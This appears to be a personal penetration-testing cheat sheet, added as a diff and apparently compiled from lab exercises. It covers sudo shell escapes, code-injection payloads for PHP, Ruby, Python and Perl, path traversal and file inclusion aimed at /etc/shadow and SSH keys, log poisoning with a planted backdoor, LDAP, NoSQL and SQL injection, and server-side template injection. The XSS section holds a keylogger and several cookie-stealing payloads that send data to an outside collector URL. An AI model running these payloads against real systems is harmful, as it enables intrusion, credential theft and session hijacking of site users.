@@ -1,0 +1,774 @@
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+##############
+# Wordlists: #
+##############
+	SecLists -> https://github.com/danielmiessler/SecLists
+	username & passwords -> https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
+
+#############
+# Encoding: #
+#############
+	use encoding detector:
+		CyberChef -> https://gchq.github.io/CyberChef/
+		https://crackstation.net/
+
+	if the hash starts by $1$ -> Md5
+	if the hash starts by $2$ or $2a$ -> Blowfish
+	if the hash starts by $5$ -> SHA-256
+	if the hash starts by $6$ -> SHA-512
+	*** hash-identifier: (identify encoding)
+	*** hashid: (identify encoding)
+	*** john: (decrypt)
+		john --wordlist=~/rockyou.txt pass.txt
+
+########
+# SSH: #
+########
+	ssh -i [private_key_file] [user]@[ip]
+
+##########
+# MySql: #
+##########
+	1- log in with just user
+		mysql -u root
+	    show databases;
+	    use [DATABASE];
+	    show tables;
+	    select * from [TABLE];
+	2- easy password
+		mysql -u root -p
+	3- attak database from the system instead from database itself
+		ls -lah /var/lib/mysql -> find out the user that can read database
+		su [user]
+		strings /var/lib/mysql/mysql/user.MYD -> get the user & password
+		john [hash_file] -> if password is hashed
+		mysql -u [user] -p
+	4- if there is a [user] who can read a file and has access to Mysql database
+		get into the database
+		use the command of:
+			select load_file('\var\key.txt');
+
+#############
+# Postgres: #
+#############
+	1- log in with just user
+		su [user]
+		psql
+	    \list to list the databases
+	    \c [DATABASE] to select the database [DATABASE]
+	    \d to list the tables
+	2- if there is a [user] who can read a file and has access to Postgres database
+		get into the database
+		use these command:
+			# CREATE TABLE demo(t text);
+			# COPY demo from '[FILENAME]';
+			# SELECT * FROM demo;
+
+#########
+# Sudo: #
+#########
+	https://gtfobins.github.io
+	sudo -l
+	sudo -u [user] [command]
+	- Vulnerable Commands:
+		find       -> sudo -u victim find /home -exec /bin/bash \;
+		vim        -> sudo -u victim vim
+		less       -> sudo -u victim less
+		awk        -> sudo -u victim awk 'BEGIN {system("/bin/bash")}'
+		cp & chmod -> vim code.c
+						#include <cstdlib>
+						int main(void){system("cat /home/victim/key.txt");}
+					  g++ -o code code.c
+					  sudo -u victim cp code ./code1
+					  sudo -u victim chmod +s code1
+					  ./code1
+		perl       -> sudo -u victim perl -e 'exec "/bin/bash";'
+		python     -> sudo -u victim python
+					  	from subprocess import call
+					  	call (['/bin/bash'])
+					  or -> sudo -u victim python -c 'import os; os.system("/bin/sh")'
+		ruby       -> sudo -u victim ruby -e 'require "irb" ; IRB.start(__FILE__)'
+					  	`/bin/bash`
+					  or -> sudo -u victim ruby -e 'exec "/bin/sh"'
+		node       -> sudo -u victim node -e 'var exec = require("child_process");exec.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+
+###################
+# Authentication: #
+###################
+	*** Dictionary Attack:
+
+	*** re-registration of an existing user Attack:
+
+	*** JSON Web Token(JWT) Attack:
+
+	*** ID number in URL:
+		1- create an account [user]
+		2- navigate url till find -> www.example.com/user/1
+		3- change id and access hidden info -> www.example.com/user/0
+
+	*** Cookie Attack:
+		1- cookie -> replace (user) by (admin)
+		2- cookie -> check hashing using google
+	3- mysql ignore case sensitivity -> register using (Admin)
+	4- mysql ignore trailing space -> register using (admin )
+	5- if there is a page redirect and its length is signification in burpsuite -> use curl to see its content
+
+##################
+# Authorization: #
+##################
+	1- URL -> - if there is a number to increment
+			  - if the number to increment is in another sub-domain
+			  - see (link.js) and (link.json) for sensitive info
+			    curl [link] -H "Accept: application/json"
+	2- Mass Assignment Attack -> 1- have a knowledge of the database and its attributes
+								 2- interupt request using burpsuite and change it by adding different conditions
+
+######################
+# Command Execution: #
+######################
+	** Common Error Msgs:
+		- Parse error -> missing bracket (),{},"",'',[]
+						 needs more arguments
+		- if the url doesn't accept any symbol you wrote such as (/) -> encrypt and decrypt payload
+
+
+	*** PHP:
+		** eval():
+			1- find out an error using ( ' , " , # , //)
+			2- the error function will declare:
+				- what language is used (php or ..)
+				- what function has the error
+				- which (',") is used -> the one that makes the error is used in the code
+			3- you can check also using codes:
+				- php -> ".sleep(0)."     - ".sleep(10)."       - ".sleep(0); //"
+						 ".system('ls')." - ".system('ls'); //" - ".system('ls'); $dummy="
+		** usort() function:
+			1- if there is (order by) in url & running using php
+			2- usort uses two parameters:
+				- array to be sorted
+				- the callback function -> where we are writing in url
+			3- exploit:
+				- find out an error using ( ' , " , # , //)
+				- what brackets is expected in error
+				- close the callback function       -> order=id}
+				- add (;) and (//)                  -> order=id;}//
+				- parse error, missing brackets     -> order=id);}//
+				- parse error, needs more arguments -> order=id,1);}//
+				- run command after function        -> order=id,1);}system('ls');//
+		** preg_replace() function:
+			1- function take 3 arguments (pattern, replacement, string)
+			   pattern is a regex
+			2- it works as following:
+			   - find (pattern) in (string) and replace it with (replacement)
+			   - if something need to be executed in (replacement), it will be after that
+			3- exploit:
+			   - find out an error using ( ' , " , # , //)
+			   - find out (pattern, replacement, string) in url
+			   - pattern=/lame/e
+			   - replacement=system('ls')
+			   - string=lame
+		** assert() function:
+			1- the error message tells what php tries to do with the value
+			2- exploit:
+			   - find out an error using ( ' , " , # , //)
+			   - if it tries to evaluate it, do the same exploitation of eval
+			   - php -> ".sleep(0)."     - ".sleep(10)."       - ".sleep(0); //"
+						 ".system('ls')." - ".system('ls'); //" - ".system('ls'); $dummy="
+
+	*** Ruby:
+		** eval():
+			1- find out an error using ( ' , " , # , //)
+			2- exploit:
+			   - A double-quote " to break out of the string                    -> name=hacker"
+			   - Add a + sign for string concatenation                          -> name=hacker"+
+			   - Another double-quote " to close the one that was already there -> name=hacker"+"
+			   - Add a call to the command `[COMMAND]`                          -> name=hacker"+`ls`+"
+			   - don't forget to URL-encode it                                  -> name=hacker"%2b`ls`%2b"
+
+	*** Python:
+		** str():
+			1- find out an error using ( ' , " , # , //)
+			   problem: the error doesn't show what language is used
+			2- exploit:
+			   - A double-quote " to break out of the string                    -> /hacker"
+			   - Add a + sign for string concatenation                          -> /hacker"+
+			   - Another double-quote " to close the one that was already there -> /hacker"+"
+			   - str(True) if executed well, it is highly probable python       -> /hacker"+str(True)+"
+			   - run a command (it will not return anything if you tried (ls))  -> /hacker"+str(os.system('id'))+"
+			     Note:
+			     if an error is encourted, (os) is not imported in the code       -> /hacker"+str(__import__('os').system('id'))+"
+			   - if command is wrong, it returens 127 and print 32512 on screen -> /hacker"+str(os.system('hacker'))+"
+			   - to run command and return the results                          -> /hacker"+str(os.popen('ls').read())+"
+
+		** url doesn't accept (/):
+			1- /hacker"+str(__import__('os').popen(os.system('cd /usr'))).read())+"
+			2- error with (/) -> encrypt payload
+			3- /hacker"+str(__import__('os').popen(__import__('base64').b64decode("ENCRYPTED_PAYLOAD"))).read())+"
+
+	*** Perl:
+		1- find out an error using ( ' , ")
+		   if string concatenation is using dot (.), then it is perl -> hacker'.'test
+		2- exploit:
+			- A singl-quote ' to break out of the string                    -> /hello?name=hacker'
+			- string concatenation                                          -> /hello?name=hacker'.'
+			- insert command using ``                                       -> /hello?name=hacker'.`uname -a`.'
+
+######################
+# Command Execution: #
+######################
+	*** Common knowledge:
+		command1 && command2 -> run command2 if command1 succeeds.
+		command1 || command2 -> command2 if command1 fails.
+		command1 ; command2 -> command1 then command2.
+		command1 | command2 -> command1 and send the output of command1 to command2.
+
+	*** blind command execution:
+		** back-tip:
+			1- find out:
+				- ping `sleep 2` -> if it tooks 2 seconds, there is back-tip injection
+				- ping `sleep 20` -> if it tooks 20 seconds, there is back-tip injection for sure
+				- ping `ping myserver.com` -> watch the request to myserver, if there is one, there is back-tip injection
+				- ping `curl myserver.com` -> watch the request to myserver, if there is one, there is back-tip injection
+			2- exploit:
+				ping `command1` -> execute command1 before executing ping, return nothing
+		
+		** variable $(command):
+			1- find out:
+				- ping $(sleep 2) -> if it tooks 2 seconds, there is variable injection
+				- ping $(sleep 20) -> if it tooks 20 seconds, there is variable injection for sure
+				- ping $(ping myserver.com) -> watch the request to myserver, if there is one, there is variable injection
+				- ping $(curl myserver.com) -> watch the request to myserver, if there is one, there is variable injection
+			2- exploit:
+				ping $(command1) -> execute command1 before executing ping, return nothing
+
+#########################
+# Directory Traversals: #
+#########################
+	*** find out:
+		/images/./photo.jpg -> you should see the same file.
+		/images/../photo.jpg -> you should get an error.
+		/images/../images/photo.jpg -> you should see the same file again.
+		/images/../IMAGES/photo.jpg -> you should get an error (depending on the file system) or something weird is going on.
+
+	*** exploit:
+		everything will appear in source code
+		** common exploit (linux):
+			1- you can use wget or curl
+			2- read source code (file name is before '?') -> www.example.com/file.php?file=./file.php
+			3- read passwd.txt -> images/../../../../../../../../../../../etc/passwd
+			4- read shadow.txt -> images/../../../../../../../../../../../etc/shadow
+
+		** exploit suffix adding:
+			1- find out:
+				- no file extension in url
+				  example: www.example.com/file.php?file=hacker
+				           hacker should be [hacker.png] or [hacker.jpg] or [hacker.txt] or ....
+				- the extension is added by code so any directory traversal attack will fail
+
+			2- exploit: [works for older version of PHP < 5.3.4]
+				- use NULL byte (%00) to eliminate the adding extension.
+				  NULL byte act like commenting the rest of the string
+				- test -> www.example.com/file.php?file=hacker.png%00
+				          if it works, then it is exploited
+				- read source code (file name is before '?') -> www.example.com/file.php?file=./file.php%00
+				- read passwd.txt -> images/../../../../../../../../../../../etc/passwd%00
+				- read shadow.txt -> images/../../../../../../../../../../../etc/shadow%00
+		
+#################
+# File Include: #
+#################
+	*** difference between Directory Traversal & File Include:
+		File Include allows RCE
+
+	*** find out:
+		1- add ' or " to url -> http://example.com/?page=intro.php'
+		2- error will have:
+			- The path of the script: /var/www/fileincl/example1.php.
+			- The function used: include() , include_once(), require(), require_once()
+			- The value used in the call to include and if it is filtered or not
+		3- inject this page (https://assets.pentesterlab.com/test_include.txt)
+		   http://example.com/?page=https://assets.pentesterlab.com/test_include.txt
+		   phpinfo page will show up if vulnerable 
+
+	  ***********************
+	*** Local File Include: *
+	  ***********************
+		** exploit:
+			1- read passwd file - last user in passwd is the current user
+		   	   	http://example.com/?page=../../../../../etc/passwd
+		   	2- read shadow file - you can see some hashes (decrypt the hashes)
+		   		http://example.com/?page=../../../../../etc/shadow
+		   	3- read .ssh files of the current user
+		   		http://example.com/?page=../../../../../home/[current_user]/.ssh/[ssh_file]
+		   	   the files can be named as:
+			   	   	authorized_keys
+					id_rsa
+					id_rsa.keystore
+					id_rsa.pub
+					known_hosts
+			   if a private key is found, use it to connect via ssh [RCE]
+			4- some useful files
+					.bash_history
+					.mysql_history
+					.my.cnf
+					.bashrc
+			5- some log files
+					/etc/httpd/logs/acces_log 
+					/etc/httpd/logs/error_log 
+					/var/www/logs/access_log 
+					/var/www/logs/access.log 
+					/usr/local/apache/logs/access_ log 
+					/usr/local/apache/logs/access. log 
+					/var/log/apache/access_log 
+					/var/log/apache2/access_log 
+					/var/log/apache/access.log 
+					/var/log/apache2/access.log
+					/var/log/access_log
+
+		** bypass suffix adding:
+			1- find out:
+				- no file extension in url
+				  example: www.example.com/?page=intro
+				           hacker should be [hacker.php]
+				- the extension is added by code so any directory traversal attack will fail
+				- it will be observed in error that the code added the extension
+			2- exploit:
+				NULL byte: [works for older version of PHP < 5.3.4]
+				1- use NULL byte (%00) to eliminate the adding extension.
+				   NULL byte act like commenting the rest of the string
+				2- test -> www.example.com/?page=intro.php%00
+				          if it works, then it is exploited
+				3- read passwd file
+					www.example.com/?page=../../../../../../etc/passwd%00
+
+		** how to read php file: [PHP filter wrapper]
+			1- failed tests:
+				- link is [www.example.com/index.php?page=error.txt]
+				- using [www.example.com/index.php?page=index.php] will not show code as it will be executed
+			2- exploit:
+				1- use php filter
+				2- bypass it using encoding and decoding to base64
+					www.example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+				3- results will be base64 encoded text and need to be decoded
+					https://www.base64decode.org/
+		   		
+	  ************************
+	*** Remote File Include: *
+	  ************************
+		** exploit:
+			1- Remote File Include -> use another php code loaded on another website or server
+			   	http://example.com/?page=https://assets.pentesterlab.com/test_include_system.txt&c=ls
+
+		** bypass suffix adding:
+			1- find out:
+				- no file extension in url
+				  example: www.example.com/?page=intro
+				           hacker should be [hacker.php]
+				- the extension is added by code so any directory traversal attack will fail
+				- it will be observed in error that the code added the extension
+			2- exploit:
+				NULL byte: [works for older version of PHP < 5.3.4]
+				1- use NULL byte (%00) to eliminate the adding extension.
+				   NULL byte act like commenting the rest of the string
+				2- test -> www.example.com/?page=intro.php%00
+				          if it works, then it is exploited
+				3- Remote File Include -> 
+				   http://example.com/?page=https://assets.pentesterlab.com/test_include_system.txt%00&c=ls
+
+				Dummy parameter:
+				1- Remote File Include ->
+				   http://example.com/?page=https://assets.pentesterlab.com/test_include_system.txt?blah=&c=ls
+
+		
+		** how to RCE php code: [PHP data wrapper]
+			1- find out:
+				1- link is [www.example.com/index.php?page=error.txt]
+				2- [AoC3 is fun!]  ----base64---->  QW9DMyBpcyBmdW4hCg==
+				3- visit 
+					www.example.com/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
+				4- you will see in the page [AoC3 is fun!]
+			2- exploit:
+				1- encode <?php system('hostname'); ?> into base64 using https://www.base64decode.org/
+						PD9waHAgc3lzdGVtKCdob3N0bmFtZScpOyA/Pg==
+				2- visit 
+					www.example.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdob3N0bmFtZScpOz8+
+				3- you will see hostname is executed
+
+		** log poisoning attack:
+			1- find out:
+				1- you should know the path to the log file
+				2- there must be a LFI vulnerability
+				3- modify user-agent using burpsuite or curl
+					curl -A "this is a test" www.example.com
+				4- you should open the log file using LFI and find 'this is a test'
+			2- exploit:
+				1- open phpinfo using 
+					curl -A "<?php phpinfo(); ?>" www.example.com
+				2- open log file using LFI. if there is phpinfo, we can inject php code
+				3- RCE attack
+					curl -A "<?php system('hostname'); ?>" www.example.com
+				4- to make things organized:
+					- curl -A "<?php echo 'results::::';system(\$_GET['cmd']); ?>" www.example.com
+				5- open log file  LFI and put cmd value
+					www.example.com/page.php?file=file.log&cmd=hostname
+				6- we can create a file that has the backdoor to open it directly
+					www.example.com/page.php?file=file.log&cmd=echo '<?php echo "results::::";system($_GET["cmd"]); ?> ' > backdoor.php
+				7- visit
+					www.example.com/backdoor.php&cmd=hostname
+				8- do the reverse shell technique
+
+		** php session attack:
+			1- find out:
+				1- where the session is saved. for example:
+					c:\Windows\Temp
+					/tmp/
+					/var/lib/php5
+					/var/lib/php/session
+				2- find out login page. make a test
+					username = test, password = test
+				3- copy your session id using inspector tool
+				4- use LFI to read your session id file. for example:
+					www.example.com/page.php?file=../../../../../../tmp/sess_[your session id]
+				5- if it shows 'test' then it is vulnerable
+			2- exploit:
+				1- open login page and write
+					username = <?php phpinfo(); ?> , password = test
+				2- use LFI to read your session id file. for example:
+					www.example.com/page.php?file=../../../../../../tmp/sess_[your session id]
+				3- you wil find phpinfo page
+				4- do the reverse shell technique
+
+
+#########
+# LDAP: #
+#########
+	*** functionality:
+		- Authentication process is handled either by database or serever. LDAP is a server that handle this process.
+		- by to processes:
+		  1- Bind:
+		     - Get the username and password
+		     - some LDAP servers may allows NULL bind -> bind username of NULL and password of NULL
+		     - NULL doesn't means empty value 
+		  2- Search:
+		     look for username and password in database
+		- syntax:
+		  (cn=[INPUT])                            -> retrieving a user, based on its username
+		  (&(cn=[INPUT1])(userPassword=[INPUT2])) -> retrieving a user, based on its username and password
+		  (|(cn=[INPUT1])(cn=[INPUT2]))           -> retrieving records matching [INPUT1] or [INPUT2]
+		  (cn=*)                                  -> retrieveing any data like sql
+		  (cn=a*)                                 -> retrieveing any data starts with 'a'
+
+
+
+	*** find out:
+		- LDAP server doesn't give error by inserting ' or "
+		- insert ) or ( or %00 -> will give error due to syntax format
+		  error -> msg:'Bad search filter'
+
+	*** exploit:
+		** NULL exploit:
+			1- interrupt request by burpsuite
+			2- remove 'username=&password=' line without removing any other line
+			   or add NULL before it '%00username=&password='
+
+		** bybass filter exploit:
+			1- comment what is after username using Null byte %00
+				http://example.com/?name=a%00&password=a -> (&(name=a   %00)(password=HASH[a]))
+			2- insert )) to clost cn bracket
+				http://example.com/?name=a))%00&password=a -> (&(name=a)) %00)(password=HASH[a]))
+			3- insert a true condition to complete syntax (cn=*)
+				http://example.com/?name=a)(cn=*))%00&password=a -> (&(name=a) (cn=*)) %00)(password=HASH[a]))
+			4- insert username=a* to get admin user
+				http://example.com/?name=a*)(cn=*))%00&password=a -> (&(name=a*) (cn=*)) %00)(password=HASH[a]))
+
+############
+# MongoDB: #
+############
+	*** normal attack:
+		** find out:
+			insert ',",(,) in the query and you will get an error has word 'mongo'
+		** exploit:
+			[don't forget url encoding if you write in url]
+			1- insert ' to close the string query
+				username=admin'
+				password=admin
+			2- one solution is to remove the password query using NULL byte
+				username=admin'%00
+				password=admin
+			3- if didn't work, make sure the username query is always true
+				username=admin' || 1==1%00
+				password=admin
+			4- Note: commenting using // or -- instead of NULL byte doesn't work sometimes
+					 it may comment a part of the code that is needed for query 
+	*** blind attack:
+		** find out:
+			- try to insert ',",(,) in the query and you will get an error has word 'mongo'
+			- if didn't work, use the syntax of mongo NonSQL, if it work, then the database is mongoDB
+				1- insert ' -> if there is no error but the query changed, continue
+					search=admin'
+				2- predict the common names of the columns in the database
+					for example: password, username, user, key, ..
+				3- use this.[colum_name].match to check if it is a mongoDB
+				   this.[colum_name].match() -> accepts Regex
+				   for example: this.[colum_name].match(/.*/) -> match all the word (always true)
+
+					search=admin' && this.password.match(/.*/)%00
+					results: query go well -> maybe there is Non-sql injection
+							 query didn't go well -> don't continue
+
+				4- put in the regex wrong passwor such as /aaaa/ -> it is false as we don't know the password
+
+					search=admin' && this.password.match(/aaaa/)%00
+					results: query go well -> don't continue
+							 query didn't go well -> maybe there is Non-sql injection
+
+				5- put another wrong column name
+
+					search=admin' && this.passwordsss.match(/.*/)%00
+					results: query go well -> don't continue
+							 query didn't go well -> there is Non-sql injection
+		** exploit:
+			1- use MongoDB_blind.py code
+			2- it check every character in the column combined with search=admin
+				search=admin' && this.passwords.match(/^a.*/)%00
+				search=admin' && this.passwords.match(/^b.*/)%00
+				search=admin' && this.passwords.match(/^c.*/)%00
+				and so on ...
+			3- each time it will check if the retrived characters are the password
+				search=admin' && this.passwords.match(/^aafasdv$/)%00
+
+##################
+# Open Redirect: #
+##################
+	** find out:
+		1- check all the redirection that is used in the web app
+		2- it is prefered to use burpsuite
+		3- try to redirect to google
+			example.com/redirect.php?uri=https://www.google.com/
+		4- some developer make the system accept link start with / to garrantee it is local in the server
+			bypass -> example.com/redirect.php?uri=//www.google.com/
+	** exploit:
+		1- you will need another url to redirect victim to -> pipedream
+			https://pipedream.com/@skarimibrahim2/p_KwCVgmG/edit
+		2- your target is to read oauth value, cookie, session id
+		3- redirect as following
+			example.com/redirect.php?uri=[pipedream link]
+		4- read the response in pipedream
+		5- bypass / restriction as follow
+			example.com/redirect.php?uri=//[pipedream.com] -> without http or https
+
+##################
+# SQL Injection: #
+##################
+	** Notes on filteration:
+		1- space filter -> instead of using spaces, use tab (%09)
+			in login username='%09or%09'1'='1'#
+		   or use injection through burpsuite and make sure to encode username='or'1'='1'#
+
+
+##############################
+# XML External Entity (XEE): #
+##############################
+	*** Syntax:
+		
+	*** find out:
+
+	*** exploit:
+
+	
+
+##############################
+# Cross Site Scripting(XSS): #
+##############################
+	*** Payloads:
+		https://github.com/payloadbox/xss-payload-list
+		
+	*** Filters:
+		** <script>,</script>,script
+			use    -->  <sCript> alert("1"); </sCript>
+			use    -->  different tag <img> , <a href='javascript:alert(1)'> , <div> ,.. etc 
+		** alert
+			use    -->  <script>confirm("1");<script>
+			or use -->  <script>eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41));<script>
+						transform char to ASCII -> https://www.browserling.com/tools/text-to-ascii
+		** onerror handler
+			use    -->  <img src="blah" ONERROR=alert("1") >
+		** un-recursive filer <script>,</script>,script
+			use    --> 
+					    <scr<script>ipt> alert("1"); </scr<script>ipt> [Not Recommended]
+							the filter may remove <script> first, then </script>
+							results in -> <script> alert("1")
+					    <scr<script>ipt> alert("1"); </scr</script>ipt> [Recommended]
+						<scr</script>ipt> alert("1"); </scr</script>ipt> [Recommended]
+		** characters is filtered
+			use --> String.fromCharCode & eval
+				<img src='sadasd' onerror='eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41))'>
+		** the special char <,>," are encoded
+			problem --> you will see the script is written in inspector tool but in source page
+
+	*** keylogger:
+		you can use xss to inject keylogger
+		<script type="text/javascript">
+			let l = "";                         	        // Variable to store key-strokes in
+			var i=new Image;                    		    // invisible img to sent data to my-server
+			document.onkeypress = function (e) { 			// Event to listen for key presses
+				l+= e.key;                       			// If user types, log it to the l variable
+				i.src="https://pipedream_link.net/?key="+l; // update this line to post to your own server
+			}
+		</script>
+
+	*** IP and Port Scanner:
+		link: https://github.com/aabeling/portscan
+		you can use xss to inject ip scanner
+		<script>
+			var my_img=new Image;
+			for (let i = 0; i < 256; i++) {
+				let ip = '192.168.0.' + i;
+				my_img.src = 'http://' + ip + '/favicon.ico';
+				my_img.onload = 'this.onerror=null; this.src=https://pipedream_link.net/?ip=' + ip;
+			}
+		</script>
+
+	*** Stored XSS:
+		1- find out:
+			- find any page has a comment or a way to store data
+			- write in comment -> hello <u>world</u>
+			- if word (world) was underlined, there is a probability of XSS
+		2- exploit:
+			** change passwords of other users:
+				- login using any user
+				- find password change page and change -> for GET request, copy link with new password
+					ex: /settings?new_password=pass123
+				- write in comment or any input that will be visited by other users
+					<script>fetch('/settings?new_password=pass123');</script>
+				* check exploit:
+					- make a new user and try to visit the page that has exploit
+					- inspect page that has exploit and check if it is in the html code
+
+			** steal cookie:
+				- write this in the comment: this will move the victim to another page [not recommended]
+					<script>
+						window.location="https://pipedream_link.net/?cookie="+document.cookie
+					</script>
+				- or use this: Silent One-Liner. it create image invisible and visit page without the victim know [recommended]
+					<script>
+						var i=new Image;
+						i.src="https://pipedream_link.net/?"+document.cookie;
+					</script>
+				- or use this: <img> Tag Instead of <script> Tags [not recommended <img>]
+				  Don't use this one! It works but calls onerror() in a loop, filling up your stolen cookie log:
+					<img src=x onerror=this.src='https://pipedream_link.net/?'+document.cookie;>
+				- or use this: <img> Tag and Without the Infinite Loop [recommended <img>]
+				  This one works and will only steal the cookie once.
+					<img src=x onerror="this.src='https://pipedream_link.net/?'+document.cookie; this.removeAttribute('onerror');">
+				- or use document.write to write in html
+					<script>
+						document.write('<img src="[URL]?c='+document.cookie+'" />');
+					</script>
+
+			** change parts of page:
+				- find out the id of the part that you will change in page source
+				- write this in the comment:
+					<script>
+						document.getElementById("thm-title").innerHTML = "I am a hacker";
+					</script>
+
+
+	*** Reflected XSS:
+		** 
+			1- find out:
+				- find any input parameter that is reflected on HTML page
+				- insert <script>alert("1");</script>
+				- if it didn't appear in page, check out source page and find out if it (<script>,</script>) is filtered or not
+				- <plaintext> will show the source code on the page which means there is XSS vulnerability 
+
+	*** DOM-Based XSS:
+		** insert element using document.write
+			* img element:
+				<img src='sadasd' onerror=alert('Hello')>
+
+		** the input is called into javascript code
+			- it is echoed into the html code
+			- try to complete it and inject script using javascript event handlers
+
+		** the subdomain is not checked:
+			1- find out:
+				- try to visit a (Non-existing domain)
+					ex: www.example.com/index.php/test
+				- if you see that that link is used in any tag such as
+					ex: <form action="/index/test">
+				- then, there is vulnerability
+				- mainly, it is used to sanitise the input. the index.php do the sanitisation
+			2- exploit:
+				- complete the tag and inject script
+					ex: www.example.com/index.php/test"<script>alert("1")</script>
+						<form action="/index/test"<script>alert("1")</script> ">
+				- or use javascript event handler
+
+
+##########################################
+# Server Side Template Injection (SSTI): #
+##########################################
+	*** Syntax:
+		This vulnerability is related to python, Django
+		to understand class, object, instances : https://www.honeybadger.io/blog/python-instantiation-metaclass/
+		** summary:
+			- definition of class Human:
+				class Human:
+	    			pass
+			- The inheritance diagram:
+							            *********************
+							            * object base class *
+							            *********************
+							                      |
+							                   inherits
+							                      |
+			    *************                 *********                 ******************
+			    * human_obj * --intance of--> * Human * --intance of--> * type Metaclass *
+			    *************                 *********                 ******************
+            - show all the attributes and methods defined of Human class. 
+              Human class has attributes inherited from object base class
+            	dir(Human)
+	            	['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__',
+					'__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__',
+					'__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__',
+					'__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']
+            - type or class of any object or variable: use type or __class__
+            	x = ""
+            	type(x)     -> <class 'str'>
+            	x.__class__ -> <class 'str'>
+            - show inheritance diagram using mro() function
+            	human_obj.__mro__ -> (<class '__main__.Human'>, <type 'object'>)
+            	human_obj.mro()   -> (<class '__main__.Human'>, <type 'object'>)
+				x.__class__.mro() -> (<type 'str'>, <type 'basestring'>, <type 'object'>)
+			- show all subclasses of any class
+				A.__subclasses__()                    -> shows all subclasses that inherits from class A
+				x.__class__.mro()[2]                  -> <type 'object'>
+				x.__class__.mro()[2].__subclasses__   -> shows all subclasses that inherits from class object
+				x.__class__.mro()[2].__subclasses__() -> () is need [don't know why]
+
+	*** find out:
+		1- find a input or try to investigate error 404 subdomains
+			www.example.com/test
+		2- write input {{2+2}}
+			www.example.com/{{2+2}}
+		3- if output is 4, then there is python template is running. there is SSTI
+
+	*** exploit:
+		1- input 
+			{{"".__class__.mro()}}
+		2- find the index of <type 'object'>
+		3- input 
+			{{"".__class__.mro()[object_index].__subclasses__()}}
+		4- find the index of Popen function
+		5- input 
+			{{"".__class__.mro()[object_index].__subclasses__()[popen_index]('uname -a',shell=True,stdout=-1).communicate()}}
+		6- documentation of popen -> https://docs.python.org/3/library/subprocess.html
+		7- shell=True -> to consider uname is a command and -a is an option in that command
+						 without it, (uname -a) as a whole will be considered as a command
+		   communicate() -> to get the output
+		8- other injections:
+			{{ ''.__class__.__mro__[2].__subclasses__()[file_index]()(<file>).read()}}
+			{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+			__globals__ -> offers some python function to be used
